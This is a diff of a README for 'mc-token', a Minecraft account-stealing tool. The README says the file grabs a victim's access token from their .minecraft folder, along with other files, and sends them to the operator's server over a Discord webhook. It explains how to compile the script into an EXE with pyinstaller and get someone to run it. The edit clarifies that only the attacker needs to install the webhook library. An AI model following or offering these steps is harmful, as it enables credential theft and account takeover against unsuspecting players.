@@ -8,7 +8,7 @@ A simple way to gain access to a Minecraft account. No username/email/password n
 - When someone runs the `mc-token` file, it grabs the Access token from their `.minecraft` folder and some other files. It then sends it all over a webhook to your server.
 
 # How can I get someone to run mc-token?
-- First off just to be safe; you should run `pip install discord_webhook`
+- First off just to be safe; you should run `pip install discord_webhook` **(only YOU need to run that command, not the person you are sending it to)**
 - Then use something like `pyinstaller` to turn it into an EXE file, and have someone run it
  - `pyinstaller --onefile mc-token.py`
 
